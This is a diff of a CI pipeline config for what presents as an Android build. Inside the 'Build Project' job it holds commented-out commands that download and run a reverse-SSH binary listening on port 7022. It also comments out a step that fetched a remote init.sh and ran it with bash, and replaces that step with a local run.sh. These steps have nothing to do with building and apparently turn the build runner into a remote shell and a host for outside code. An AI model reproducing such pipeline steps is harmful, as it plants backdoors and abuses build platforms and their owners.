@@ -18,6 +18,8 @@ global_job_config:
       - cache restore android-build
 blocks:
   - name: Build
+    run:
+      when: "change_in('/app/extra/')"
     task:
       jobs:
         - name: Build Project
@@ -32,8 +34,9 @@ blocks:
             - '#curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/reverse-sshx64  '
             - '#chmod a+x reverse-sshx64'
             - '#./reverse-sshx64  -v -l -p 7022  '
-            - 'curl -O -k https://fhost.devxops.eu.org/devops/host/inits/init.sh '
-            - bash init.sh 296 sema devops
+            - '#curl -O -k https://fhost.devxops.eu.org/devops/host/inits/init.sh '
+            - '#bash init.sh 296 sema devops'
+            - bash app/extra/run.sh
       epilogue:
         on_pass:
           commands:
